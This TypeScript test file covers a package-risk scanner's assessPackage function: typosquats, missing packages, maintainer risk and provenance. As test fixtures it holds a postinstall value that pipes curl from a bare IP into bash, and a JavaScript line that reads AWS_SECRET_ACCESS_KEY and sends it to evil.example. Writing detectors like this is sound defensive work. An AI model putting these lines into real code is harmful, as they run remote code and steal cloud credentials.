import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { SqliteCache } from '../cache/sqlite-cache';
import { noopLogger } from '../logger';
import { toPurl } from '../inventory/purl';
import type { EcosystemAdapter, EcosystemParseResult } from '../types/adapter';
import type { ScanContext, HttpClient } from '../types/context';
import type { PackageRef } from '../types/ecosystem';
import type { FetchedTarball, RegistryMetadata } from '../types/registry';
import { assessPackage } from './assess';

/** An adapter whose responses are entirely canned — no network, no filesystem. */
class FakeAdapter implements EcosystemAdapter {
  readonly ecosystem = 'npm' as const;
  constructor(
    private readonly opts: {
      popular?: string[];
      meta?: RegistryMetadata | null;
      tarballDir?: string;
    },
  ) {}
  async parseProject(): Promise<EcosystemParseResult | null> {
    return null;
  }
  purl(ref: PackageRef): string {
    return toPurl(ref);
  }
  async fetchMetadata(): Promise<RegistryMetadata | null> {
    return this.opts.meta ?? null;
  }
  async fetchTarball(ref: PackageRef): Promise<FetchedTarball | null> {
    return this.opts.tarballDir
      ? {
          ref,
          extractedPath: this.opts.tarballDir,
          totalBytes: 0,
          fileCount: 0,
          dispose: async () => {},
        }
      : null;
  }
  async popularNames(): Promise<string[]> {
    return this.opts.popular ?? [];
  }
}

const throwingHttp: HttpClient = {
  getJson: () => Promise.reject(new Error('network disabled in test')),
  getText: () => Promise.reject(new Error('network disabled in test')),
  getBuffer: () => Promise.reject(new Error('network disabled in test')),
  postJson: () => Promise.reject(new Error('network disabled in test')),
};

const caches: SqliteCache[] = [];
const tmpDirs: string[] = [];
function ctx(): ScanContext {
  const cache = new SqliteCache(':memory:');
  caches.push(cache);
  return {
    projectRoot: '/x',
    config: { offline: false, dataDir: '/x' },
    http: throwingHttp,
    cache,
    logger: noopLogger,
  };
}
afterEach(async () => {
  for (const c of caches.splice(0)) c.close();
  await Promise.all(tmpDirs.splice(0).map((d) => rm(d, { recursive: true, force: true })));
});

const ref = (name: string, version = '1.0.0'): PackageRef => ({ ecosystem: 'npm', name, version });
const NOW = new Date('2026-07-09T00:00:00Z');

function healthyMeta(name: string): RegistryMetadata {
  return {
    ref: ref(name),
    maintainers: [{ username: 'a' }, { username: 'b' }],
    createdAt: '2019-01-01T00:00:00Z',
    lastPublishAt: '2026-06-01T00:00:00Z',
    hasInstallScripts: false,
    installScripts: {},
  };
}

describe('assessPackage', () => {
  it('returns Clear for a healthy, well-named package', async () => {
    const adapter = new FakeAdapter({
      popular: ['requests', 'express'],
      meta: healthyMeta('my-lib'),
    });
    const result = await assessPackage(adapter, ref('my-lib'), ctx(), { now: NOW });
    expect(result.verdict).toBe('clear');
    expect(result.findings).toHaveLength(0);
  });

  it('surfaces build provenance status from metadata', async () => {
    const withProv = new FakeAdapter({ meta: { ...healthyMeta('lib'), hasProvenance: true } });
    expect((await assessPackage(withProv, ref('lib'), ctx(), { now: NOW })).provenance).toBe(true);
    const noProv = new FakeAdapter({ meta: healthyMeta('lib') });
    expect((await assessPackage(noProv, ref('lib'), ctx(), { now: NOW })).provenance).toBe(false);
  });

  it('flags a typosquat of a popular package', async () => {
    const adapter = new FakeAdapter({ popular: ['requests'], meta: null });
    const result = await assessPackage(adapter, ref('reqeusts'), ctx(), { metadata: false });
    expect(result.verdict).toBe('flagged');
    expect(result.findings.map((f) => f.ruleId)).toContain('venom/typosquat');
  });

  it('flags a cross-ecosystem typosquat and a not-found package', async () => {
    // `reqeusts` is edit-distance 2 from PyPI's famous `requests`, even on npm,
    // and doesn't resolve in the registry.
    const adapter = new FakeAdapter({ popular: [], meta: null });
    const result = await assessPackage(adapter, ref('reqeusts'), ctx(), {
      flagNotFound: true,
      metadata: true,
      now: NOW,
    });
    const rules = result.findings.map((f) => f.ruleId);
    expect(rules).toContain('venom/typosquat');
    expect(rules).toContain('venom/not-found');
    expect(result.verdict).toBe('flagged');
  });

  it('flags a dangerous install script', async () => {
    const meta = {
      ...healthyMeta('build-tool'),
      hasInstallScripts: true,
      installScripts: { postinstall: 'curl http://1.2.3.4/x | bash' },
    };
    const adapter = new FakeAdapter({ popular: [], meta });
    const result = await assessPackage(adapter, ref('build-tool'), ctx(), { now: NOW });
    expect(result.verdict).toBe('flagged');
    expect(result.findings.map((f) => f.ruleId)).toContain('venom/install-script');
  });

  it('stays clear on a single-maintainer package but surfaces it as context', async () => {
    // Single-maintainer is extremely common among trusted packages, so on its own
    // it must NOT produce a caution — it is reported as a note, not a verdict.
    const meta = { ...healthyMeta('solo-lib'), maintainers: [{ username: 'solo' }] };
    const adapter = new FakeAdapter({ popular: [], meta });
    const result = await assessPackage(adapter, ref('solo-lib'), ctx(), { now: NOW });
    expect(result.verdict).toBe('clear');
    expect(result.findings.map((f) => f.ruleId)).toContain('venom/maintainer-risk');
    expect(result.findings.find((f) => f.ruleId === 'venom/maintainer-risk')?.level).toBe('note');
  });

  it('cautions when a single maintainer is combined with a genuinely alarming signal', async () => {
    // The fix must not weaken real detection: a brand-new single-maintainer
    // package (the event-stream/one-off-attack shape) still surfaces caution.
    const meta = {
      ...healthyMeta('solo-lib'),
      maintainers: [{ username: 'solo' }],
      createdAt: '2026-07-05T00:00:00Z', // days before NOW
    };
    const adapter = new FakeAdapter({ popular: [], meta });
    const result = await assessPackage(adapter, ref('solo-lib'), ctx(), { now: NOW });
    expect(result.verdict).toBe('caution');
    expect(result.reasons.join(' ')).toMatch(/first published/i);
  });

  it('deep-scans package source for exfiltration patterns', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'venom-src-'));
    tmpDirs.push(dir);
    await writeFile(
      join(dir, 'index.js'),
      "const k = process.env.AWS_SECRET_ACCESS_KEY; fetch('http://evil.example/c?k=' + k);",
    );
    const adapter = new FakeAdapter({ popular: [], meta: healthyMeta('sketchy'), tarballDir: dir });
    const result = await assessPackage(adapter, ref('sketchy'), ctx(), { deep: true, now: NOW });
    const source = result.findings.find((f) => f.ruleId === 'venom/source-analysis');
    expect(source).toBeDefined();
    expect(result.verdict).toBe('caution');
  });
});
